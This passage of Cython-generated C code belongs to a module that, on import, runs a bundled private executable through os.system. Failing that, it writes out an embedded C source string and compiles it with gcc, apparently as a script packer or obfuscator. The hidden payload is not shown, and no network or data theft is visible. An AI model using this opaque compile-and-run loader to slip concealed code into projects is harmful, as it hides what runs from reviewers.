__Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 19, __pyx_L1_error)\n  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 4073, __pyx_L1_error)\n  return 0;\n  __pyx_L1_error:;\n  return -1;\n}\n\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_InitCachedConstants\", 0);\n\n\n  __pyx_tuple__4 = PyTuple_Pack(1, __pyx_int_0); if (unlikely(!__pyx_tuple__4)) __PYX_ERR(0, 19, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__4);\n  __Pyx_GIVEREF(__pyx_tuple__4);\n\n\n  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_kp_u__6); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 4056, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__7);\n  __Pyx_GIVEREF(__pyx_tuple__7);\n  __pyx_tuple__8 = PyTuple_Pack(1, __pyx_k""p_u__5); if (unlikely(!__pyx_tuple__8)) __PYX_ERR(0, 4056, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__8);\n  __Pyx_GIVEREF(__pyx_tuple__8);\n  __pyx_slice__9 = PySlice_New(Py_None, __pyx_int_neg_1, Py_None); if (unlikely(!__pyx_slice__9)) __PYX_ERR(0, 4056, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_slice__9);\n  __Pyx_GIVEREF(__pyx_slice__9);\n\n\n  __pyx_tuple__10 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__10)) __PYX_ERR(0, 4073, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__10);\n  __Pyx_GIVEREF(__pyx_tuple__10);\n  __Pyx_RefNannyFinishContext();\n  return 0;\n  __pyx_L1_error:;\n  __Pyx_RefNannyFinishContext();\n  return -1;\n}\n\nstatic CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {\n  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_int_neg_1 = PyInt_FromLong(-1); if (unlikely(!__pyx_int_neg_1)) __PYX_ERR(0, 5, __pyx_L1_error)\n  return 0;\n  __pyx_L1_error:;\n  return -1;\n}\n\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/\n\nstatic int __Pyx_modinit_global_init_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_global_init_code\", 0);\n  /*--- Global init code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_variable_export_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_variable_export""_code\", 0);\n  /*--- Variable export code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_function_export_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_function_export_code\", 0);\n  /*--- Function export code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_type_init_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_type_init_code\", 0);\n  /*--- Type init code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_type_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_type_import_code\", 0);\n  /*--- Type import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_variable_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_variable_import_code\", 0);\n  /*--- Variable import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_function_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_function_import_code\", 0);\n  /*--- Function import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\n\n#ifndef CYTHON_NO_PYINIT_EXPORT\n#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC\n#elif PY_MAJOR_VERSION < 3\n#ifdef __cplusplus\n#define __Pyx_PyMODINIT_FUNC extern \"C\" void\n#else\n#define __Pyx_PyMODINIT_FUNC void\n#endif\n#else\n#ifdef __cplusplus\n#define __Pyx_PyMODINIT_FUNC extern \"C\" PyObject *\n#else\n#define __Pyx_PyMODINIT_FUNC PyObject *\n#endif\n#endif\n\n\n#if PY_MAJOR_VERSION < 3\n__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/\n__Pyx_PyMODINIT_FUNC initsource(void)\n#else\n__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/\n__Pyx_PyMODINIT_FUNC PyInit_source(void)\n#if CYTHON_PEP489_MULTI_PHASE_INIT\n{\n  return PyModuleDef_Init(""&__pyx_moduledef);\n}\nstatic CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {\n    #if PY_VERSION_HEX >= 0x030700A1\n    static PY_INT64_T main_interpreter_id = -1;\n    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);\n    if (main_interpreter_id == -1) {\n        main_interpreter_id = current_id;\n        return (unlikely(current_id == -1)) ? -1 : 0;\n    } else if (unlikely(main_interpreter_id != current_id))\n    #else\n    static PyInterpreterState *main_interpreter = NULL;\n    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;\n    if (!main_interpreter) {\n        main_interpreter = current_interpreter;\n    } else if (unlikely(main_interpreter != current_interpreter))\n    #endif\n    {\n        PyErr_SetString(\n            PyExc_ImportError,\n            \"Interpreter change detected - this module can only be loaded into one interpreter per process.\");\n        return -1;\n    }\n    return 0;\n}\nstatic CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {\n    PyObject *value = PyObject_GetAttrString(spec, from_name);\n    int result = 0;\n    if (likely(value)) {\n        if (allow_none || value != Py_None) {\n            result = PyDict_SetItemString(moddict, to_name, value);\n        }\n        Py_DECREF(value);\n    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {\n        PyErr_Clear();\n    } else {\n        result = -1;\n    }\n    return result;\n}\nstatic CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {\n    PyObject *module = NULL, *moddict, *modname;\n    if (__Pyx_check_single_interpreter())\n        return NULL;\n    if (__pyx_m)\n        return __Pyx_NewRef(__pyx_m);\n    modname = PyObject_GetAttrString(spec, \"name\");\n    if (unlikely(!modname)) goto bad;\n    module = PyModule_NewObject(modname);\n    Py_DECREF(modname);\n   "" if (unlikely(!module)) goto bad;\n    moddict = PyModule_GetDict(module);\n    if (unlikely(!moddict)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"loader\", \"__loader__\", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"origin\", \"__file__\", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"parent\", \"__package__\", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"submodule_search_locations\", \"__path__\", 0) < 0)) goto bad;\n    return module;\nbad:\n    Py_XDECREF(module);\n    return NULL;\n}\n\n\nstatic CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)\n#endif\n#endif\n{\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  int __pyx_t_4;\n  PyObject *__pyx_t_5 = NULL;\n  PyObject *__pyx_t_6 = NULL;\n  PyObject *__pyx_t_7 = NULL;\n  PyObject *__pyx_t_8 = NULL;\n  PyObject *__pyx_t_9 = NULL;\n  PyObject *__pyx_t_10 = NULL;\n  int __pyx_t_11;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannyDeclarations\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  if (__pyx_m) {\n    if (__pyx_m == __pyx_pyinit_module) return 0;\n    PyErr_SetString(PyExc_RuntimeError, \"Module 'source' has already been imported. Re-initialisation is not supported.\");\n    return -1;\n  }\n  #elif PY_MAJOR_VERSION >= 3\n  if (__pyx_m) return __Pyx_NewRef(__pyx_m);\n  #endif\n  #if CYTHON_REFNANNY\n__Pyx_RefNanny = __Pyx_RefNannyImportAPI(\"refnanny\");\nif (!__Pyx_RefNanny) {\n  PyErr_Clear();\n  __Pyx_RefNanny = __Pyx_RefNannyImportAPI(\"Cython.Runtime.refnanny\");\n  if (!__Pyx_RefNanny)\n      Py_FatalError(\"failed to import 'refnanny' module\");\n}\n#endif\n  __Pyx_RefNannySetupContext(\"__Pyx_PyMODINIT_FUNC PyInit_source(void)\", 0);\n  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #ifdef __Pxy_PyFrame_Initialize_Offsets""\n  __Pxy_PyFrame_Initialize_Offsets();\n  #endif\n  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_empty_bytes = PyBytes_FromStringAndSize(\"\", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __pyx_empty_unicode = PyUnicode_FromStringAndSize(\"\", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 5, __pyx_L1_error)\n  #ifdef __Pyx_CyFunction_USED\n  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_Coroutine_USED\n  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_Generator_USED\n  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_AsyncGen_USED\n  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_StopAsyncIteration_USED\n  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  /*--- Library function declarations ---*/\n  /*--- Threads initialization code ---*/\n  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS\n  PyEval_InitThreads();\n  #endif\n  /*--- Module creation code ---*/\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  __pyx_m = __pyx_pyinit_module;\n  Py_INCREF(__pyx_m);\n  #else\n  #if PY_MAJOR_VERSION < 3\n  __pyx_m = Py_InitModule4(\"source\", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);\n  #else\n  __pyx_m = PyModule_Create(&__pyx_moduledef);\n  #endif\n  if (unlikely(!__pyx_m)) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 5, __pyx_L1_error)\n  Py_INCREF(__pyx_d);\n  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 5, __pyx_L1_error)\n  Py_INCREF(__pyx_b);""\n  __pyx_cython_runtime = PyImport_AddModule((char *) \"cython_runtime\"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 5, __pyx_L1_error)\n  Py_INCREF(__pyx_cython_runtime);\n  if (PyObject_SetAttrString(__pyx_m, \"__builtins__\", __pyx_b) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  /*--- Initialize various global constants etc. ---*/\n  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)\n  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n  if (__pyx_module_is_main_source) {\n    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  }\n  #if PY_MAJOR_VERSION >= 3\n  {\n    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 5, __pyx_L1_error)\n    if (!PyDict_GetItemString(modules, \"source\")) {\n      if (unlikely(PyDict_SetItemString(modules, \"source\", __pyx_m) < 0)) __PYX_ERR(0, 5, __pyx_L1_error)\n    }\n  }\n  #endif\n  /*--- Builtin init code ---*/\n  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  /*--- Constants init code ---*/\n  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  /*--- Global type/function init code ---*/\n  (void)__Pyx_modinit_global_init_code();\n  (void)__Pyx_modinit_variable_export_code();\n  (void)__Pyx_modinit_function_export_code();\n  (void)__Pyx_modinit_type_init_code();\n  (void)__Pyx_modinit_type_import_code();\n  (void)__Pyx_modinit_variable_import_code();\n  (void)__Pyx_modinit_function_import_code();\n  /*--- Execution code ---*/\n  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)\n  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  #endif\n\n\n  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  if (PyDict_SetItem(__py""x_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PSH_TEAM_KEY, __pyx_kp_u_) < 0) __PYX_ERR(0, 8, __pyx_L1_error)\n\n\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXECUTE_FILE, __pyx_kp_u_PY_PRIVATE_20240909130901773) < 0) __PYX_ERR(0, 10, __pyx_L1_error)\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_prefix); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PREFIX, __pyx_t_2) < 0) __PYX_ERR(0, 11, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_1 = PyNumber_Add(__pyx_kp_u_export_PYTHONHOME, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXPORT_PYTHONHOME, __pyx_t_1) < 0) __PYX_ERR(0, 12, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_executable); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_1 = PyNumber""_Add(__pyx_kp_u_export_PYTHON_EXECUTABLE, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE, __pyx_t_1) < 0) __PYX_ERR(0, 13, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 15, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_2 = PyNumber_Add(__pyx_kp_u__2, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 15, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_RUN, __pyx_t_2) < 0) __PYX_ERR(0, 15, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 17, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_path); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_isfile); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 17, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 17, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 17, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  if (__pyx_t_4) {\n\n\n    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unli""kely(!__pyx_t_3)) __PYX_ERR(0, 18, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_system); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 18, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_EXPORT_PYTHONHOME); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 18, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __pyx_t_2 = PyNumber_Add(__pyx_t_3, __pyx_kp_u__3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 18, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 18, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __pyx_t_5 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 18, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __pyx_t_3 = PyNumber_Add(__pyx_t_5, __pyx_kp_u__3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 18, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_RUN); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 18, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __pyx_t_2 = PyNumber_Add(__pyx_t_3, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 18, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 18, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n    __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__4, NULL); if (unlikely(!__""pyx_t_5)) __PYX_ERR(0, 19, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n  }\n\n\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C_SOURCE, __pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define) < 0) __PYX_ERR(0, 21, __pyx_L1_error)\n\n\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C_FILE, __pyx_kp_u_py_private_c) < 0) __PYX_ERR(0, 4055, __pyx_L1_error)\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4056, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_version); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4056, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4056, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__7, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4056, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __pyx_t_5 = __Pyx_GetItemInt(__pyx_t_2, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4056, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_split); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4056, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__8, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4056, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_PyObject_GetSlice(__pyx_t_5, 0, -1L, NULL, NULL, &__pyx_slice__9, 0, 1, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4056, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __pyx_t_""5 = PyUnicode_Join(__pyx_kp_u__5, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4056, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PYTHON_VERSION, __pyx_t_5) < 0) __PYX_ERR(0, 4056, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4059, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n\n\n  __pyx_t_2 = PyNumber_Add(__pyx_kp_u_gcc_I, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4058, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n  __pyx_t_5 = PyNumber_Add(__pyx_t_2, __pyx_kp_u_include_python); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4059, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PYTHON_VERSION); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4061, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n\n\n  __pyx_t_1 = PyNumber_Add(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4060, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_kp_u_o); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4061, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_EXECUTE_FILE); if 